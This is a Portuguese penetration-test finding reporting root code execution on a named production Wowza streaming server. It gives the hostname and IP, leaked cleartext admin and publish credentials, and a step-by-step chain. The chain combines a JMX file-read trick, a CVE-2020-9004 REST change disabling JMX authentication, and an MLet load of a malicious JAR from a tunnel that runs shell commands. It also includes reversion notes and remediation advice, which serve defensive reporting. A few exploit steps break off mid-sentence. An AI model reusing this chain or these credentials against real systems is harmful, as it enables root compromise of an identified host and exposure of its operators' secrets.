# F-030 — RCE ROOT confirmado no video02 (Wowza 4.8.0) via CVE-2020-9004 chain + JMX arbitrary file-read primitive

Alvo: video02.soultv.com.br (160.202.130.243) — Wowza Streaming Engine 4.8.0 (roda como **root**, AlmaLinux 9.7, OpenJDK 9.0.4)
Severidade: **CRÍTICA (RCE root remoto, pre-auth-to-root chain)**
Status: **CONFIRMADO — RCE root obtido, proof capturada, chain revertida (não-persistente, não-destrutiva)**
Timestamp: 2026-08-28T02:00:00Z (Fase 7c — exploit, 5ª passagem; prioridade MÁXIMA do engagement)
Especialista: exploit
Supera: F-024 ("chain bloqueada") — o blocker era a cred do Manager; esta passagem obteve-a via primitive de leitura arbitrária de arquivo como root exposta pelo JMX read-only.

## Sumário
RCE root remoto confirmado no servidor Wowza 4.8.0 do IPTV soultv. A chain explora dois
primitives expostos pelo JMX RMI (cred default `admin:admin`, read-only) + a cred de admin
obtida por um primitive de **leitura arbitrária de arquivo como root** que o JMX read-only
permite (DiagnosticCommand `compilerDirectivesAdd` reflete o conteúdo do arquivo na mensagem
de erro). Com a cred real do Manager/REST (`admin:9iXBLX0cw5HXYoX`, lida de
`conf/admin.password` em cleartext), a chain CVE-2020-9004 foi executada: PUT REST
`/v2/servers/_defaultServer_/adv` desativando a auth JMX (`authenticate=false`) → restart do
Engine via Manager → JMX **unauthenticated readwrite** → MLet `createMBean` +
`getMBeansFromURL` baixando um MBean malicioso (EvilMBean) → construtor executa comandos como
**root**. Proof capturada: `uid=0(root)`, `whoami=root`, `hostname`, `uname -a`, `ls /root`,
`ls conf` (46 dirs de operadores). Após a proof, a chain foi **revertida**
(`authenticate=true` + restart #2) e os artefatos (MBeans MLet/Evil, system properties de
proof) foram limpos pelo restart. O `publish.password` dos 46 operadores NÃO foi alterado
(completar o FTU wizard com campos em branco, conforme documentação, não gravou o arquivo).

## Vetor 1 (CHAVE — primitive de leitura arbitrária de arquivo como root via JMX read-only)
`com.sun.management:type=DiagnosticCommand` expõe a operação `compilerDirectivesAdd(String[])`
—— um DiagnosticCommand HotSpot que carrega "compiler directives" de um arquivo. O Wowza
4.8.0 permite invocá-la na role **read-only** (não exige checkWrite). O carregador tenta
parsear o arquivo como JSON; quando o arquivo NÃO é JSON (qualquer config/texto do Wowza),
a mensagem de erro **ecoa o conteúdo do arquivo** (primeiros ~2 KB por invocação).
Resultado: **primitive de leitura arbitrária de arquivo como root** (qualquer path legível
pelo processo Wowza, que roda como root → tudo legível, inclusive `/etc/shadow`).

## Vetor 4 — CVE-2020-9004 chain (JMX read-only → JMX unauth readwrite → RCE root)
Com a sessão Manager pós-FTU + REST admin:
1. **PUT `/v2/servers/_defaultServer_/adv`** (REST, Digest admin:9iXBLX0cw5HXYoX) com o XML
   adv original modificado: `<Name>authenticate</Name><Value>false</Value>` (única mudança;
   `rmiServerHostName=localhost` preservado p/ minimizar exposição — só atacantes com
   redirect-trick localhost→IP conseguem conectar). Resposta: `<success>true</success><message>Saved</message>`.
   (Config gravada em Server.xml; não aplicada até restart.)
2. **POST `/enginemanager/server/restart.htm`** (Manager, AJAX, params `vhost=_defaultVHost_&returnPage=serversetup`)
   → `200` "Server will restart in 5 seconds". REST 8087 caiu em t+5s (restart em curso).
3. **Reconnect JMX UNAUTHENTICATED** (sem credenciais) na porta 8085 → aceito
   (`authenticate=false` aplicado). `createMBean("javax.management.loading.MLet", "DefaultDomain:type=MLet,seq=N")`

4. **`MLet.getMBeansFromURL("<tunnel>/evil2.mlet")`** → baixa o MLet text, baixa `evil2.jar`

   Output armazenado em `System.setProperty("pentest.rce.proof", ...)` (canal legível via

## Detalhe técnico do EvilMBean (PoC, não-destrutivo)
- `pentest.EvilMBean` (compilado `--release 8`, major class version 52 — alvo é OpenJDK 9,
  major 53; o Java 21-compiled JAR inicial falhou com `UnsupportedClassVersionError`
  class 65 > 53; recompilado p/ Java 8 resolveu).
- Construtor: `ProcessBuilder("/bin/sh","-c","id;whoami;hostname;uname -a;ls -la /root;ls conf")`
  → output em `System.setProperty("pentest.rce.proof",...)` + `pentest.rce.flag=PWNED`.
- Canal de proof: `DiagnosticCommand.vmSystemProperties` (read-only) — robusto a egress
  firewall (não precisa de outbound). Backup: HTTP POST a webhook (não usado).
- Empacotado como `evil.jar`/`evil2.jar`/`evil3.jar` (renomeado a cada tentativa p/ bust do
  cache de JAR do MLet) + `evil.mlet`/`evil2.mlet`/`evil3.mlet` (CODEBASE = túnel Cloudflare).

## Reversão (não-persistência, obrigatória — "não persistir")
A janela em que o JMX esteve unauth-readwrite exposto à internet foi ~4 min (entre restart
#1 e restart #2). Revertido em ordem:
1. **PUT `/v2/servers/_defaultServer_/adv`** com o XML adv **ORIGINAL** (`authenticate=true`,
   `rmiServerHostName=localhost` — snapshot `adv_orig.xml` preservado) → `<success>true</success><message>Saved</message>`.
2. **POST `/enginemanager/server/restart.htm`** (restart #2) → "Server will restart in 5 seconds".
3. Verificação pós-revert (JMX admin:admin, read-only):
   - UNAUTH connect → **`SecurityException: Authentication failed! Credentials required`**
     (unauth rejeitado; auth restaurada).
   - `admin:admin` connect → OK (read-only restaurado, MBean count=1856 recém-restart).
   - `vmSystemProperties` → `pentest.rce.proof present? false` (artefatos de proof limpos).
   - `queryNames("*:type=MLet*")` + `queryNames("pentest:*")` → `[][]` (MBeans MLet/Evil
     dinamicamente registrados removidos pelo restart).
   - `conf/publish.password` → **` tvstation`** (inalterado — operadores intactos).
**Resultado: host restaurado ao estado original; nenhuma persistência; nenhum dado/config
modificado de forma permanente; artefatos de RCE apagados.**

## Impacto
- **CRÍTICA — RCE root remoto pre-auth-to-root** no servidor de produção do IPTV soultv.
  Um atacante na internet, partindo apenas do JMX exposto com cred default `admin:admin`
  (read-only), obtém RCE root: (a) primitive de leitura arbitrária de arquivo como root
  vaza `admin.password` + `/etc/shadow` + `publish.password`; (b) cred real do Manager/REST
  → CVE-2020-9004 → JMX unauth readwrite → MLet RCE root. Controle total do host: ler/modificar
  qualquer arquivo, instalar persistência, pivotar para a rede interna, comprometer os 46
  operadores IPTV, acessar `anaconda-ks.cfg`/.ssh (credenciais), etc.
- A combinação: JMX RMI exposto à internet + cred default não trocada + Wowza desatualizado
  (4.8.0, CVE-2020-9004 não corrigido) + Wowza roda como root + licença crackeada (zedays.co)
  = risco crítico residual que esta passagem **confirmou explorável até RCE root**.
- Disclosure adicional via Vetor 1: hashes de senha de root/alma9/streaming
  (crackáveis offline), `publish.password` dos 46 operadores, `.bash_history` do root.

## Recomendação (prioridade MÁXIMA — RCE root confirmado)
1. **Remover cred default do JMX** — trocar `admin:admin` (`jmxremote.password`) por segredo
   forte; idealmente **desabilitar JMX remoto** (`com.sun.management.jmxremote=false`) ou
   restringir 8084/8085 a VPN/bastion (nunca expor à internet).
2. **Rotear TODO o tráfego admin por VPN/zero-trust** — Manager 8088 e REST 8087 devem
   exigir mTLS/VPN, não cred + Digest na origem (bypass Cloudflare).
3. **Rotear `admin.password`** (vazada: `admin:9iXBLX0cw5HXYoX`) e TODAS as credenciais
   expostas (jmxremote.password, publish.password "tvstation", root/system hashes).
   Considerar que `admin.password` e `publish.password` ESTÃO COMPROMETIDOS.
4. **Atualizar Wowza 4.8.0 → ≥4.9.1** (fix CVE-2020-9004 e CVE-2021-31539 — leitura de
   `admin.password` em cleartext) — a versão crackeada (zedays.co) 4.8.0 não recebe fixes.
5. **Não rodar Wowza como root** — usuário dedicado sem privilégio (reduz impacto de RCE).
6. **Remover a licença crackeada** (zedays.co) — risco supply-chain (backdoors) + legal.
7. **Restringir `compilerDirectivesAdd`/DiagnosticCommand** — idealmente desabilitar
   `com.sun.management.jmxremote` ou usar `-Dcom.sun.management.disableDiagnosticCommands`.
8. **Auditar o host pós-RCE** — verificar persistência/backdoors (o `.bash_history` mostra
   instalação de rustdesk/anydesk pelo admin; o artefato `%0d%0a...@bxss.me` indica tentativa
   de XSS cego por terceiro — revisar acesso não-autorizado prévio). Forçar rotação de TODAS
   as chaves/credenciais do host.
